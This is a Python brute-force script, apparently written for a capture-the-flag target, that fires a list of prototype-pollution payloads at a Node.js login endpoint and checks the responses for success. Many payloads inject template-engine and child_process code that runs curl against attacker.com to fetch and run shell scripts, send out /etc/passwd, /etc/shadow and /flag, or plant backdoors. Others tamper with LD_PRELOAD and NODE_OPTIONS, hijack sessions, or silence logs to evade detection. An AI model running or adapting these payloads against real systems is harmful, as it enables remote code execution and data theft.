import requests
from urllib.parse import urlencode, quote

url = "http://7.189.87.199:30089/login"
headers = {
    "Host": "7.189.87.199:30089",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://7.189.87.199:32023/login",
    "If-Match": 'W/"10-l/9ohNb/MR2SIbI"'
}

# ==================== 原型链污染 payload 池（共 26 类 72 个） ====================
payloads = [
    # === 1. 基础原型污染 === [1,2](@ref)
    {"username[__proto__][login]": "1", "password[__proto__][isAdmin]": "1"},
    {"username[__proto__][userid]": "admin", "password[__proto__][role]": "admin"},
    {"username[constructor][prototype][auth]": "true"},
    {"username[__proto__][authCheck]": "false", "password[__proto__][role]": "superuser"},

    # === 2. 全局配置篡改 === [2,5](@ref)
    {"username[__proto__][NODE_ENV]": "development", "password[__proto__][NODE_OPTIONS]": "--inspect=0.0.0.0:9229"},
    {"username[__proto__][NODE_TLS_REJECT_UNAUTHORIZED]": "0"},  # TLS验证绕过[5](@ref)
    {"username[__proto__][SECRET_KEY]": "hacked_key", "password[__proto__][DEBUG]": "true"},

    # === 3. 模板引擎 RCE（新增 6 个curl攻击）=== [7,8](@ref)
    {"username[__proto__][outputFunctionName]": "_;process.mainModule.require('child_process').execSync('curl http://attacker.com/shell.sh | bash')//"},
    {"username[__proto__][outputFunctionName]": "_;process.mainModule.require('child_process').execSync('curl -d \"$(cat /etc/passwd)\" http://attacker.com/exfil')//"},  # 数据外带
    {"password[__proto__][compileDebug]": "1"},
    {"username[__proto__][source]": "process.mainModule.require('child_process').execSync('curl -o /tmp/backdoor.sh http://attacker.com/payload')"},
    {"username[__proto__][escapeFunction]": "global.process.mainModule.require('child_process').execSync('curl -X POST -H \"Content-Type: application/json\" -d @/etc/passwd http://attacker.com/leak')"},
    {"username[__proto__][compileDebug]": "1", "password[__proto__][client]": "console.log(global.process.mainModule.require('child_process').execSync('curl --silent http://attacker.com/recon | bash'))"},  # 静默模式攻击
    {
        "username[__proto__][templateSettings]": "{'escape': function(){return process.mainModule.require('child_process').execSync('curl -F 'flag=@/flag' http://attacker.com/upload')}}",
        "password[__proto__][interpolate]": "/<%=([\\s\\S]+?)%>/g"
    },

    # === 4. 会话劫持 === [1,2](@ref)
    {"username[__proto__][session][user]": "admin", "password[__proto__][session][authenticated]": "true"},
    {"username[__proto__][session][cookie][httpOnly]": "false", "password[__proto__][session][cookie][sameSite]": "None"},
    {"username[__proto__][cookie][domain]": ".attacker.com"},

    # === 5. 沙箱逃逸（新增 4 个curl攻击）=== [4,9](@ref)
    {"username[__proto__][__proto__][execSync]": "function(cmd){return global.process.mainModule.require('child_process').execSync('curl --output /dev/null --header \"X-Exploit: 1\" http://attacker.com/ping')}"},
    {
        "username[__proto__][execArgv]": ["--eval=require('child_process').execSync('curl --data-binary @/etc/shadow http://attacker.com/steal')"],
        "password[__proto__][NODE_OPTIONS]": "--require /tmp/evil.js"
    },
    {
        "username[__proto__][vm]": "{runInThisContext: function(code){return eval(code)}}",
        "password[__proto__][Script]": "function(code){return process.mainModule.require('child_process').execSync('curl -k https://attacker.com/malware | sh')}"
    },
    {
        "username[__proto__][child_process]": "{execSync: function(cmd){return global.process.mainModule.require('http').get('http://attacker.com/log?cmd='+encodeURIComponent(cmd))}}",
        "password[__proto__][spawnSync]": "function(){return 0}"
    },

    # === 6. 环境变量攻击（新增 3 个curl攻击）=== [5,9](@ref)
    {"username[__proto__][PATH]": "/attacker/bin:$PATH", "password[__proto__][LD_PRELOAD]": "/tmp/evil.so"},
    {"username[__proto__][LD_PRELOAD]": "/tmp/evil.so"},
    {"username[__proto__][PATH]": "/tmp:$PATH", "password[__proto__][LD_PRELOAD]": "/tmp/cron_hook.so"},
    {
        "username[__proto__][NODE_OPTIONS]": "--require /proc/self/environ",
        "password[__proto__][env]": "{CURL_CMD: 'curl http://attacker.com/stager | bash'}"
    },
    {
        "username[__proto__][LD_PRELOAD]": "/tmp/curl_hook.so",
        "password[__proto__][LD_LIBRARY_PATH]": "/tmp"
    },

    # === 7. 第三方中间件攻击（新增 2 个curl攻击）=== [3,6](@ref)
    {quote(quote("username[_proto_][name]")): "../../../etc/passwd", quote(quote("password[_proto_][mv]")): "function(path){require('fs').writeFileSync(path, 'curl http://attacker.com/exploit')}"},
    {quote(quote("username[_proto_][name]")): "evil.exe", quote(quote("password[_proto_][data]")): "<%= process.mainModule.require('child_process').execSync('curl -H \"Authorization: Bearer ${TOKEN}\" http://attacker.com/auth') %>"},

    # === 8. 编码绕过（新增 3 个curl攻击）=== [3,8](@ref)
    {"username%25255B%25255Fproto%25255D%25255Badmin%25255D": "1", "password%25255B%25255Fproto%25255D%25255BisAdmin%25255D": "1"},
    {quote(quote("username[_proto_][auth]")): "1", quote(quote("password[_proto_][bypass]")): "1"},
    {
        "username[__proto__][\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f][NODE_ENV]": "development",
        "password[__proto__][\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065][DEBUG]": "*"
    },
    {"username%25255B\u005f\u005fproto%25255D[admin]": "1"},
    {"username[＿proto＿][auth]": "1"},
    {
        "username[__proto__][\u0065\u0078\u0065\u0063]": "function(){return process.mainModule.require('child_process').execSync('curl --upload-file /flag http://attacker.com/upload')}",
        "password[__proto__][\u0073\u0070\u0061\u0077\u006e]": "function(){return 0}"
    },

    # === 9. 内存操作篡改（新增 2 个curl攻击）=== [5,10](@ref)
    {"password[__proto__][Buffer][from]": "function(str){return process.mainModule.require('child_process').execSync('curl -d @'+str+' http://attacker.com/decode')}"},
    {
        "username[__proto__][Buffer][alloc]": "function(size){return 'A'.repeat(size)}",
        "password[__proto__][write]": "function(str){return this.require('child_process').execSync('curl --data \"'+str+'\" http://attacker.com/log')}"
    },
    {
        "username[__proto__][Buffer][toString]": "function(encoding){return this.require('child_process').execSync('curl http://attacker.com/keylogger?data='+this.toString())}",
        "password[__proto__][read]": "function(){return Buffer.from('hacked')}"
    },

    # === 10. 异步流程劫持（新增 3 个curl攻击）=== [4,9](@ref)
    {"username[__proto__][then]": "function(resolve){resolve(global.process)}"},
    {
        "username[__proto__][catch]": "function(){return this.mainModule.require('child_process')}",
        "password[__proto__][Symbol.toStringTag]": "Module"
    },
    {
        "username[__proto__][Symbol.asyncIterator]": "function*(){yield process.mainModule.require('child_process').execSync('curl --tlsv1.2 https://attacker.com/secure')}",
        "password[__proto__][next]": "function(){return {value:'hacked', done:false}}"
    },
    {
        "username[__proto__][Promise]": "function(executor){executor(()=>process.mainModule.require('child_process').execSync('curl -O http://attacker.com/rce.sh'), ()=>{})}",
        "password[__proto__][all]": "function(){return 0}"
    },

    # === 11. 文件操作攻击（新增 2 个curl攻击）=== [2,5](@ref)
    {"username[__proto__][root]": "/", "password[__proto__][normalize]": "function(){return '../../../../etc/passwd'}"},
    {"username[__proto__][destination]": "/tmp", "password[__proto__][filename]": "shell.php"},
    {
        "username[__proto__][fs]": "{writeFileSync: function(path,data){return process.mainModule.require('child_process').execSync('curl -F file=@'+path+' http://attacker.com/exfil')}}",
        "password[__proto__][readFileSync]": "function(){return 'hacked'}"
    },

    # === 12. 请求伪造（新增 4 个curl攻击）=== [6,8](@ref)
    {"username[__proto__][headers][X-Forwarded-For]": "127.0.0.1", "password[__proto__][headers][Host]": "attacker.com"},
    {"username[__proto__][headers][Content-Security-Policy]": "default-src 'unsafe-inline'"},
    {"username[__proto__][headers][Sec-WebSocket-Protocol]": "evil-protocol"},
    {
        "username[__proto__][request]": "function(){return process.mainModule.require('child_process').execSync('curl --proxy socks5://attacker.com:9050 http://internal/api')}",
        "password[__proto__][agent]": "{protocol:'http:'}"
    },

    # === 13. 日志篡改 === [2,5](@ref)
    {
        "username[__proto__][console][log]": "function(msg){if(msg.includes('password')) sendToAttacker(msg)}",
        "password[__proto__][console][error]": "function(){return}"
    },

    # === 14. 模块劫持 === [5,9](@ref)
    {"username[__proto__][mainModule][paths]": "['/tmp/evil_modules']"},
    {
        "username[__proto__][require]": "function(m){return m=='child_process'?global.process.mainModule.require(m):null}",
        "password[__proto__][mainModule]": "{paths:['/tmp/evil_modules']}"
    },

    # === 15. Lodash 漏洞利用 === [1,3](@ref)
    {"username[__proto__][constructor][prototype][polluted]": "true"},

    # === 16. Kibana 环境注入 === [5,8](@ref)
    {"username[__proto__][env][NODE_OPTIONS]": "--require /proc/self/environ"},

    # === 17. Undefsafe 污染 === [2,5](@ref)
    {"username[__proto__][toString]": "function(){return 'evil'}"},

    # === 18. 多库联合攻击 === [5,9](@ref)
    {"username[__proto__][require]": "function(m){return m=='child_process'?global.process.mainModule.require(m):null}"},

    # === 19. Redis劫持 === [5,10](@ref)
    {"username[__proto__][redis_host]": "attacker-ip", "password[__proto__][redis_port]": "6379"},

    # === 20. Kubernetes配置污染 === [9](@ref)
    {"username[__proto__][kubernetes][apiServer]": "https://attacker-k8s:6443"},

    # === 21. GraphQL解析器劫持 === [7](@ref)
    {"username[__proto__][resolve]": "function(){return process.mainModule.require('child_process')}"},

    # === 22. 反检测逻辑 === [5,9](@ref)
    {"username[__proto__][console][error]": "function(){}"},

    # === 23. 定时器劫持（新增curl攻击）=== [4,5](@ref)
    {
        "username[__proto__][setTimeout]": "function(cb){return process.mainModule.require('child_process').execSync('curl --max-time 10 http://attacker.com/heartbeat')}",
        "password[__proto__][setInterval]": "function(){return 1000}"
    },

    # === 24. 子进程参数注入（新增curl攻击）=== [6,7](@ref)
    {
        "username[__proto__][shell]": "/bin/bash",
        "password[__proto__][execPath]": "/tmp/backdoor"
    },

    # === 25. 网络协议劫持（新增）=== [5,7](@ref)
    {
        "username[__proto__][http]": "{request: function(){return process.mainModule.require('child_process').execSync('curl --interface eth0 http://attacker.com/traffic')}}",
        "password[__proto__][https]": "{request: function(){return 0}}"
    },

    # === 26. DNS劫持（新增）=== [9](@ref)
    {
        "username[__proto__][dns]": "{lookup: function(hostname,callback){return process.mainModule.require('child_process').execSync('curl http://attacker.com/dns?host='+hostname)}}",
        "password[__proto__][resolve]": "function(){return 0}"
    }
]

def send_pollution_request(payload):
    try:
        encoded_data = urlencode(payload, safe="[]_")
        response = requests.post(url, headers=headers, data=encoded_data)
        analyze_response(response, payload)
    except Exception as e:
        print(f"[!] Error: {str(e)}")

def analyze_response(response, payload):
    success_flags = {
        "rce": ["root", "uid=0", "execSync", "child_process", "/tmp/pwned"],
        "session_hijack": ["Set-Cookie", "sessionid", "admin=1"],
        "config_leak": ["DEBUG", "SECRET_KEY", "NODE_TLS_REJECT_UNAUTHORIZED"],
        "redirect": ["302", "Location: /admin"],
        "dos": ["500 Internal Server Error", "toString is not a function"],
        "file_upload": ["evil.exe", "passwd", "shell.php"],
        "env_hijack": ["NODE_OPTIONS", "LD_PRELOAD"],
        "log_tamper": ["sendToAttacker", "console.log is not a function"],
        "curl_attack": ["200 OK", "curl_easy_perform()", "Content-Type: application/octet-stream"]
    }
    
    print(f"\n[+] Payload: {payload}")
    print(f"Status: {response.status_code}, Length: {len(response.text)}")
    
    for flag_type, keywords in success_flags.items():
        if any(key in response.text for key in keywords) or (flag_type == "redirect" and response.history):
            print(f"[!] Possible {flag_type.upper()} Success! Snippet:\n{response.text[:300]}...")
            break
    if "error" not in response.text.lower() and response.status_code != 500:
        print("[*] Payload may have silent success (no visible error)")

if __name__ == "__main__":
    print("[*] Launching full-coverage prototype pollution brute-force...")
    for idx, payload in enumerate(payloads):
        print(f"\n=== Testing Payload {idx+1}/{len(payloads)} ===")
        send_pollution_request(payload)
    print("\n[!] All payloads tested. Analyze responses for anomalies.")